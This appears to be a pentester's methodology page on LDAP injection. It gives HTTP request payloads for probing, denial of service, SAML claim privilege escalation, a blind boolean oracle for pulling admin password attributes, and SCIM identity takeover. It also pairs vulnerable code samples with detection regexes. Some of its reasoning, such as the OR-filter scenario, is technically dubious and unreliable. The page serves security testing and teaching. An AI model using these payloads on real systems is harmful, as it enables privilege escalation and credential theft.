# LDAP Injection

## Check List

## Methodology

### Black Box

#### Base Injection

{% stepper %}
{% step %}
Navigate to the registration page and begin a new registration using normal, valid data

```http
POST /register HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

firstName=Ali&lastName=Rezaei&email=ali.rezaei@test.com&password=Test@123
```
{% endstep %}

{% step %}
Capture the registration request using an intercepting proxy and resend it, confirming that the server processes the standard input without errors

```http
POST /register HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

firstName=Ali&lastName=Rezaei&email=ali.rezaei2@test.com&password=Test@123
```
{% endstep %}

{% step %}
Start a second registration attempt and modify the request so that the first name field contains an invalid LDAP-related character, such as a double quote `"`, before submitting it to the same endpoint

```http
POST /register HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

firstName=Ali"&lastName=Rezaei&email=ali.rezaei3@test.com&password=Test@123
```
{% endstep %}

{% step %}
Observe the server’s response, where the application fails to sanitize the user-supplied value and triggers a fatal LDAP-related error `(0x80005000)`, indicating that the unsanitized input is being passed directly to an LDAP operation
{% endstep %}
{% endstepper %}

***

#### LDAP Filter Injection — Denial of Service

{% stepper %}
{% step %}
Install and configure the Cloudron Surfer version: `5.9.0` environment or a local replica. Set up the LDAP test server `(ldapjstestserver.js)` and start Surfer with LDAP-related environment variables to enable directory-based authentication
{% endstep %}

{% step %}
Review the authentication flow in auth.js. Identify that the username value from req.body.username is inserted directly into an LDAP filter without sanitization

```http
(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))
```
{% endstep %}

{% step %}
Confirm that the login mechanism performs an LDAP search using this filter before password binding, making the filter fully user-controlled
{% endstep %}

{% step %}
Test normal behavior by logging in using valid credentials, then test with a long benign username to confirm the system remains stable under large but non-malicious input
{% endstep %}

{% step %}
Craft a payload that introduces LDAP filter characters (already demonstrated in your PoC) to expand the resulting filter. Example

```http
payload = "*)" + "(cn=*)"* repeat many times + "(cn=*"
```
{% endstep %}

{% step %}
Send the payload to `/api/login` using the provided Python script. The application constructs a massive LDAP filter, causing excessive processing by the LDAP server and memory exhaustion in Node.js
{% endstep %}

{% step %}
Observe that the server becomes unresponsive and eventually crashes with a heap-exhaustion error, confirming Denial of Service via LDAP Injection
{% endstep %}
{% endstepper %}

***

### White Box

#### Privilege Escalation via JIT Group Hydration in Federated SAML Pipelines

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on the Single Sign-On (SSO) integration boundaries and Just-In-Time (JIT) provisioning flows
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the enterprise's Identity Federation architecture. Modern B2B SaaS platforms allow organizations to integrate their own Identity Providers (IdPs) via SAML 2.0 or OIDC
{% endstep %}

{% step %}
Investigate the JIT Role Mapping optimization. Upon a successful SAML login, the SaaS application must determine the user's local permissions. Because the SAML token only contains generic claims (e.g., `Department` or `Title`), the Service Provider (SP) must execute a backend query against an internal Active Directory/LDAP replica to resolve the user's specific group memberships
{% endstep %}

{% step %}
Discover the "Bulk Query" performance optimization. To avoid executing a separate LDAP `Bind` and `Search` operation for every individual user traversing the gateway, the backend developer dynamically constructs a bulk LDAP filter using the claims extracted directly from the trusted SAML assertion
{% endstep %}

{% step %}
Locate the LDAP Directory Synchronization service in the decompiled codebase
{% endstep %}

{% step %}
Analyze the LDAP query construction. Observe that the developer directly concatenates the `Department` claim from the SAML token into the filter string: `(&(objectClass=user)(department={SamlDepartmentClaim}))`
{% endstep %}

{% step %}
Understand the critical architectural assumption: The developer assumes that because the SAML assertion is cryptographically signed by the Identity Provider, the data within it is inherently "safe" and structurally rigid. They completely conflate _cryptographic authenticity_ with _input sanitization_, omitting standard LDAP escaping (e.g., escaping `*`, `(`, `)`, `\`, `NUL`)
{% endstep %}

{% step %}
Recognize the trust boundary failure: While the IdP's signature guarantees the data wasn't tampered with in transit, the attacker (acting as an administrator of their own Bring-Your-Own IdP tenant) has absolute authority over the _content_ of those claims before they are signed
{% endstep %}

{% step %}
Authenticate to your attacker-controlled IdP (e.g., a free Okta developer instance). Navigate to the profile attributes mapping
{% endstep %}

{% step %}
Modify your user's `Department` attribute. Inject an LDAP filter payload designed to break out of the target application's query and append a high-privilege group condition (e.g., `IT)(memberOf=CN=Enterprise Admins,OU=Groups,DC=corp,DC=local`)
{% endstep %}

{% step %}
Initiate the SAML SSO flow to the target enterprise application
{% endstep %}

{% step %}
The Service Provider verifies the cryptographic signature, trusts the claim, interpolates the unescaped payload into the LDAP execution plan, and requests the permissions
{% endstep %}

{% step %}
The underlying LDAP engine evaluates the poisoned filter, successfully matches the injected administrative group condition, and permanently hydrates the attacker's local JIT session with overarching administrative privileges

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The ACS (Assertion Consumer Service) validates the mathematical signature of the incoming SAML token and extracts the custom `Department` claim, \[2] To eliminate the N+1 query problem during peak SSO login windows, the backend executes a highly optimized bulk search against the internal LDAP replica based on the user's declared department, \[3] The architecture intrinsically trusts the IdP. The developer assumes that because the IdP successfully signed the token, the contents of the claims are sanitized infrastructure metadata, \[4] The fatal boundary collapse. The string concatenation injects the raw claim into the LDAP Abstract Syntax Tree (AST). The LDAP protocol natively utilizes parentheses `()` and asterisks `*` as execution operators. By controlling the signed claim, the attacker establishes direct control over the downstream LDAP execution engine

```http
// 1. Attacker controls a BYO-IdP tenant mapped to the Enterprise application.
// 2. Attacker modifies their local IdP user profile.
// Set Department to: IT)(memberOf=CN=SuperAdmins,OU=Roles,DC=enterprise,DC=local

// 3. Attacker initiates the SP-initiated SAML login flow.
POST /saml/acs HTTP/1.1
Host: sso.enterprise.tld
Content-Type: application/x-www-form-urlencoded

SAMLResponse=PD94b...[CRYPTOGRAPHICALLY_VALID_SAML_ASSERTION]...

// 4. The SP parses the assertion and constructs the following LDAP Query:
// (&(objectClass=user)(department=IT)(memberOf=CN=SuperAdmins,OU=Roles,DC=enterprise,DC=local))

// 5. The LDAP server evaluates the query, maps the attacker to the SuperAdmin group, 
// and returns the highly privileged JWT.
HTTP/1.1 302 Found
Set-Cookie: EnterpriseAuth=eyJhbG...[ADMIN_TOKEN]...
Location: /admin/dashboard
```
{% endstep %}

{% step %}
To support complex B2B identity federation, the enterprise engineered a Just-In-Time role provisioning pipeline. To optimize authorization resolution, the architecture bypassed intermediary mapping tables and queried the internal LDAP directory directly using claims extracted from the SAML assertion. By failing to apply LDAP encoding to the cryptographically verified claims, the developer introduced a parser desynchronization between the SAML trust boundary and the LDAP execution boundary. The attacker exploited their ownership of the BYO-IdP to inject LDAP execution operators into their own profile attributes. The API Gateway processed the valid signature, concatenated the malicious claim into the filter, and executed the query. The LDAP engine resolved the injected `memberOf` condition, silently escalating the attacker's cross-tenant session to a global administrative context
{% endstep %}
{% endstepper %}

***

#### Data Exfiltration via Blind LDAP in Background Export Pipelines

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous, data-heavy features like CSV exports, compliance reports, or background telemetry generation
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the Event-Driven reporting architecture. When an enterprise user requests a massive CSV export (e.g., "Export All Employees in Finance"), the API Gateway immediately returns a `202 Accepted` and pushes an `ExportRequestedEvent` to a message queue (e.g., RabbitMQ)
{% endstep %}

{% step %}
Investigate the background worker responsible for draining this queue
{% endstep %}

{% step %}
Discover the database query optimization. Generating thousands of records via traditional HTTP REST API calls to the Identity Microservice would overwhelm the network. Instead, the background worker is granted direct, read-only TCP access to the core Active Directory/LDAP server
{% endstep %}

{% step %}
Analyze the LDAP search construction within the background worker. The worker extracts the `Department` targeting parameter from the internal event payload and constructs the search filter (e.g., `(&(objectClass=person)(department={event.Department}))`)
{% endstep %}

{% step %}
Recognize the "Trusted Queue" assumption. The background worker explicitly assumes that the API Gateway thoroughly sanitized the `Department` parameter before pushing the event onto the message queue
{% endstep %}

{% step %}
Revisit the API Gateway's ingress controllers. Confirm that the Gateway validated the user's JWT but merely checked if the `Department` parameter was a non-empty string, deferring semantic validation to the downstream consumers
{% endstep %}

{% step %}
Formulate the Blind LDAP attack chain. Standard LDAP injection aims to bypass authentication. Here, the goal is data extraction from the internal Active Directory network. You must construct a boolean oracle
{% endstep %}

{% step %}
Inject an LDAP payload into the export request that conditionally evaluates a highly sensitive Active Directory attribute (e.g., `LAPS` passwords, `userPassword` hashes, or `description` fields)
{% endstep %}

{% step %}
Example Payload: `Finance)(sAMAccountName=DomainAdmin)(userPassword=A*`
{% endstep %}

{% step %}
If the Domain Admin's password hash begins with 'A', the injected LDAP query evaluates to True, and the worker generates a CSV file containing 1 record
{% endstep %}

{% step %}
If the Domain Admin's password hash does not begin with 'A', the query evaluates to False, and the worker generates a CSV file containing 0 records
{% endstep %}

{% step %}
By polling the `/api/v1/exports/{id}/download` endpoint, the presence or absence of a record in the generated CSV file serves as a perfect asynchronous boolean oracle, allowing you to brute-force and exfiltrate the entire internal Active Directory schema byte-by-byte

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=person\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=|SearchRequest\s*\([^)]*Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=person\).*\+\s*|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter|SearchControls)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"].*\$filter|ldap_search\s*\(.*\$event|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=person\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=person\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=person\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*\$event|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\(objectClass=person\).*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class EmployeeExportWorker : IMessageConsumer<ExportRequestedEvent>
{
    private readonly LdapConnection _ldap;
    private readonly IStorageService _s3;

    public async Task ConsumeAsync(ExportRequestedEvent evt)
    {
        // [1]
        // [2]
        var filter = $"(&(objectClass=person)(department={evt.TargetDepartment}))";
        var request = new SearchRequest("DC=internal,DC=corp", filter, SearchScope.Subtree, "cn", "mail");
        
        // [3]
        var response = (SearchResponse)_ldap.SendRequest(request);

        // [4]
        var csvData = GenerateCsv(response.Entries);
        await _s3.UploadExportAsync(evt.ExportId, csvData);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class EmployeeExportWorker {

    @Autowired
    private LdapTemplate ldapTemplate;
    @Autowired
    private StorageService s3;

    @RabbitListener(queues = "export-requests")
    public void consume(ExportRequestedEvent evt) {
        // [1]
        // [2]
        String filter = "(&(objectClass=person)(department=" + evt.getTargetDepartment() + "))";
        
        // [3]
        List<EmployeeDto> results = ldapTemplate.search(
            query().base("DC=internal,DC=corp").filter(filter),
            new EmployeeAttributesMapper()
        );

        // [4]
        byte[] csvData = generateCsv(results);
        s3.uploadExport(evt.getExportId(), csvData);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class EmployeeExportWorker implements ShouldQueue
{
    protected $ldap;
    protected $s3;

    public function handle(ExportRequestedEvent $evt)
    {
        // [1]
        // [2]
        $filter = "(&(objectClass=person)(department={$evt->targetDepartment}))";
        
        // [3]
        $search = ldap_search($this->ldap, "DC=internal,DC=corp", $filter, ['cn', 'mail']);
        $entries = ldap_get_entries($this->ldap, $search);

        // [4]
        $csvData = $this->generateCsv($entries);
        $this->s3->uploadExport($evt->exportId, $csvData);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class EmployeeExportWorker {
    static async consume(evt) {
        // [1]
        // [2]
        let filter = `(&(objectClass=person)(department=${evt.targetDepartment}))`;

        let opts = {
            filter: filter,
            scope: 'sub',
            attributes: ['cn', 'mail']
        };

        // [3]
        let entries = await new Promise((resolve, reject) => {
            ldapClient.search('DC=internal,DC=corp', opts, (err, res) => {
                let data = [];
                res.on('searchEntry', (entry) => data.push(entry.object));
                res.on('end', () => resolve(data));
                res.on('error', (e) => reject(e));
            });
        });

        // [4]
        let csvData = generateCsv(entries);
        await s3.uploadExport(evt.exportId, csvData);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The background worker dequeues the payload from the internal message broker, \[2] To avoid crushing the internal API mesh with millions of HTTP requests during massive directory exports, the worker is granted direct, highly privileged read access to the Active Directory domain controllers, \[3] The architecture relies completely on asynchronous trust propagation. Because the event originated from behind the API Gateway's perimeter firewall, the worker implicitly assumes the `TargetDepartment` string is clean and structurally validated, \[4] The worker executes the LDAP search and serializes the results into an AWS S3 bucket. By analyzing the output file (specifically checking if it is empty or populated), the attacker gains a highly reliable, asynchronous Boolean Oracle. This oracle allows them to infer the exact character composition of heavily restricted internal AD attributes

```http
// 1. Attacker initiates an async export request, injecting a Blind LDAP payload into the department field.
// They are checking if the Domain Administrator's password hash begins with '$'.
POST /api/v1/exports/employees HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer <low_privilege_token>
Content-Type: application/json

{"department": "Finance)(sAMAccountName=Administrator)(userPassword=$*"}

// 2. Gateway returns 202 Accepted. The worker executes the query:
// (&(objectClass=person)(department=Finance)(sAMAccountName=Administrator)(userPassword=$*))

HTTP/1.1 202 Accepted
{"export_id": "EXP-9912"}
```

```http
// 3. Attacker polls the download endpoint.
GET /api/v1/exports/download/EXP-9912 HTTP/1.1
Host: gateway.enterprise.tld
Authorization: Bearer <low_privilege_token>

// 4. Server returns the CSV. If the CSV contains a record, the attacker knows the first character is '$'.
// If the CSV is empty, the attacker increments to the next character (e.g., 'A*') and repeats the attack.
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Length: 0
```
{% endstep %}

{% step %}
To fulfill the business requirement of generating massive compliance exports without destabilizing the synchronous API infrastructure, engineers implemented an Event-Driven architecture powered by a dedicated background worker. To maximize throughput, the worker bypassed standard HTTP data access layers and executed queries directly against the core Active Directory servers. The architectural failure occurred at the synchronization boundary: the ingress gateway validated the existence of the parameter but deferred LDAP-specific escaping, falsely assuming the worker utilized parameterized queries. The attacker exploited this by injecting boolean logic operators into the message payload. When the worker processed the payload, the LDAP engine evaluated the blind conditions. By observing the presence or absence of data in the resulting CSV export file, the attacker successfully established an asynchronous Blind LDAP Oracle, systematically exfiltrating the most sensitive cryptographic hashes and organizational structures from the internal network
{% endstep %}
{% endstepper %}

***

#### Identity Takeover via Polymorphic ObjectGUID Resolution in Async Directory Synchronization

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a complex Identity Migration or Cross-Forest Synchronization architecture. In large M\&A (Mergers and Acquisitions) scenarios, enterprise architectures run background workers to seamlessly migrate users from a legacy Active Directory forest into a modern Cloud Identity Provider (e.g., Azure AD or Okta)
{% endstep %}

{% step %}
Investigate the synchronization bottleneck: Employees frequently change their primary email addresses due to marriages, name changes, or corporate rebranding. If the synchronization script relies purely on the `mail` attribute to map identities, it will create duplicate accounts and orphan historical data
{% endstep %}

{% step %}
Discover the "Polymorphic Resolution" optimization. To guarantee absolute identity continuity across email changes, the synchronization script attempts to match the user based on _either_ their current email address _or_ their immutable legacy `EmployeeID` / `ObjectGUID`
{% endstep %}

{% step %}
Analyze the LDAP query construction within the synchronization service. Observe the use of the LDAP OR `|` operator: `(&(objectClass=user)(|(mail={IncomingEmail})(employeeID={IncomingEmployeeId})))`
{% endstep %}

{% step %}
Understand the trust boundary and mapping configuration. The incoming payload originates from the modern Cloud IdP's webhook (e.g., SCIM provisioning webhook). The developer assumes that because the webhook request is authenticated, the incoming JSON properties (`email` and `employeeId`) are strictly validated against their expected data types
{% endstep %}

{% step %}
Verify the ingress validation logic. Notice that to support external contractors or vendors who do not possess a standard numeric `EmployeeID`, the frontend JSON schema validator explicitly types the `employeeId` field as a `String` and performs no strict alphanumeric regex filtering
{% endstep %}

{% step %}
Exploit the polymorphic OR condition. Create an account in the modern Cloud IdP (or manipulate an existing low-privilege contractor account)
{% endstep %}

{% step %}
Update your own `employeeId` attribute in the cloud portal to inject a wildcard and an administrative capability flag (e.g., `*)(adminCount=1`)
{% endstep %}

{% step %}
The Cloud IdP fires the SCIM provisioning webhook to the enterprise backend
{% endstep %}

{% step %}
The synchronization script executes the LDAP query: `(&(objectClass=user)(|(mail=attacker@evil.com)(employeeID=*)(adminCount=1)))`.
{% endstep %}

{% step %}
Because the `|` (OR) operator evaluates `(employeeID=*)` AND `(adminCount=1)` as True, the LDAP engine short-circuits the email check. It returns the legacy Domain Administrator's profile from the Active Directory forest.
{% endstep %}

{% step %}
The synchronization script assumes it successfully resolved your legacy identity. It seamlessly merges the Active Directory Domain Administrator's privileges, historical groups, and access rights into your modern Cloud IdP session context

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(&\(objectClass=user\)\(\|\(mail=\{.*\}|\bFilter\s*=.*\(\|\(mail=.*\+|DirectorySearcher\s*\{[\s\S]{0,150}?Filter\s*=|SearchRequest\s*\([^)]*Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(\|\(mail=.*\+|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,150}?filter|SearchControls)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*\(\|\(mail=.*\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(\|\(mail=\$\{|filter\s*:\s*['"].*\(\|\(mail=.*\+|client\.search\s*\(|ldapjs[\s\S]{0,150}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(\|\(mail=\{|DirectorySearcher.*Filter|SearchRequest
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(\|\(mail=.*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\(\|\(mail=|ldap_search\(.*\$filter|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\(\|\(mail=\$\{|client\.search\(|ldapjs.*filter
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ScimSyncWorker : IMessageConsumer<ScimUserEvent>
{
    private readonly LdapConnection _ldap;
    private readonly ICloudIdpClient _cloudIdp;

    public async Task ConsumeAsync(ScimUserEvent evt)
    {
        // [1]
        // [2]
        var filter = $"(&(objectClass=user)(|(mail={evt.Email})(employeeID={evt.EmployeeId})))";
        
        var request = new SearchRequest("DC=legacy,DC=local", filter, SearchScope.Subtree, "memberOf", "sAMAccountName");
        var response = (SearchResponse)_ldap.SendRequest(request);

        // [3]
        if (response.Entries.Count > 0)
        {
            var legacyUser = response.Entries[0];
            
            // [4]
            await _cloudIdp.UpdateUserRolesAsync(evt.CloudUserId, legacyUser.Attributes["memberOf"].GetValues(typeof(string)).Cast<string>());
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class ScimSyncWorker {

    @Autowired
    private LdapTemplate ldapTemplate;
    @Autowired
    private CloudIdpClient cloudIdp;

    @RabbitListener(queues = "scim-events")
    public void consume(ScimUserEvent evt) {
        // [1]
        // [2]
        String filter = "(&(objectClass=user)(|(mail=" + evt.getEmail() + ")(employeeID=" + evt.getEmployeeId() + ")))";
        
        // [3]
        List<LegacyUserDto> results = ldapTemplate.search(
            query().base("DC=legacy,DC=local").filter(filter),
            new LegacyUserMapper()
        );

        if (!results.isEmpty()) {
            LegacyUserDto legacyUser = results.get(0);
            
            // [4]
            cloudIdp.updateUserRoles(evt.getCloudUserId(), legacyUser.getMemberOf());
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ScimSyncWorker implements ShouldQueue
{
    protected $ldap;
    protected $cloudIdp;

    public function handle(ScimUserEvent $evt)
    {
        // [1]
        // [2]
        $filter = "(&(objectClass=user)(|(mail={$evt->email})(employeeID={$evt->employeeId})))";
        
        // [3]
        $search = ldap_search($this->ldap, "DC=legacy,DC=local", $filter, ['memberOf', 'sAMAccountName']);
        $entries = ldap_get_entries($this->ldap, $search);

        if ($entries['count'] > 0) {
            $legacyUser = $entries[0];
            
            // [4]
            $this->cloudIdp->updateUserRoles($evt->cloudUserId, $legacyUser['memberof']);
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class ScimSyncWorker {
    static async consume(evt) {
        // [1]
        // [2]
        let filter = `(&(objectClass=user)(|(mail=${evt.email})(employeeID=${evt.employeeId})))`;

        let opts = {
            filter: filter,
            scope: 'sub',
            attributes: ['memberOf', 'sAMAccountName']
        };

        // [3]
        let entries = await new Promise((resolve, reject) => {
            ldapClient.search('DC=legacy,DC=local', opts, (err, res) => {
                let data = [];
                res.on('searchEntry', (entry) => data.push(entry.object));
                res.on('end', () => resolve(data));
                res.on('error', (e) => reject(e));
            });
        });

        if (entries.length > 0) {
            let legacyUser = entries[0];
            
            // [4]
            await cloudIdp.updateUserRoles(evt.cloudUserId, legacyUser.memberOf);
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The background worker processes identity synchronization events originating from an external System for Cross-domain Identity Management (SCIM) provider, \[2] The architectural requirement to maintain identity continuity across email address changes necessitates the use of a polymorphic OR `|` query, checking both the mutable email and the immutable legacy identifier, \[3] The synchronization engine heavily relies on the LDAP server to enforce directory boundaries. It executes the query and optimistically selects the first returned record, \[4] The fatal state transformation. By successfully poisoning the LDAP query, the attacker forces the LDAP engine to return an arbitrary administrative account. The synchronization script interprets this response as definitive proof that the attacker's modern cloud account is the legitimate continuation of the legacy Administrator. It instantly copies the administrative group memberships into the attacker's active cloud session, completing an organization-wide identity takeover

```http
// 1. Attacker (Contractor) accesses the self-service HR portal hooked to the SCIM pipeline.
// 2. Attacker modifies their EmployeeID field to exploit the Polymorphic OR query.
// Payload: *)(adminCount=1
PATCH /api/v1/hr/profile HTTP/1.1
Host: selfservice.enterprise.tld
Authorization: Bearer <low_privilege_contractor_token>
Content-Type: application/json

{
  "email": "contractor@evil.com",
  "employeeId": "*)(adminCount=1"
}

// 3. The HR Portal fires the SCIM webhook to the backend sync worker.
// 4. The Sync Worker executes the LDAP query: 
// (&(objectClass=user)(|(mail=contractor@evil.com)(employeeID=*)(adminCount=1)))

// 5. The LDAP server matches the `(adminCount=1)` condition, returning the legacy Domain Admin.
// 6. The Sync Worker updates the Contractor's cloud profile with Domain Admin roles.
// 7. Attacker logs into the cloud dashboard with full privileges.
```
{% endstep %}

{% step %}
To ensure zero data loss and flawless identity mapping during a massive enterprise merger, engineers designed a synchronization pipeline that prioritized identity resolution flexibility. By querying multiple discrete attributes using an LDAP OR operator, the script could mathematically guarantee account linking even if primary attributes mutated. The security vulnerability materialized because the frontend schema permitted loose string values for legacy identifiers to accommodate external vendors. The attacker exploited this loose typing to inject LDAP syntax. When the sync script processed the payload, the attacker's injected `*)(adminCount=1` syntax fundamentally rewrote the structural constraints of the OR `|` block. The LDAP engine resolved the query to the legacy environment's most highly privileged account. The synchronization worker blindly trusted this resolution, mapped the administrative capabilities into the attacker's active session, and orchestrated a complete supply-chain identity takeover without generating any failed authentication logs
{% endstep %}
{% endstepper %}

***



## Cheat Sheet
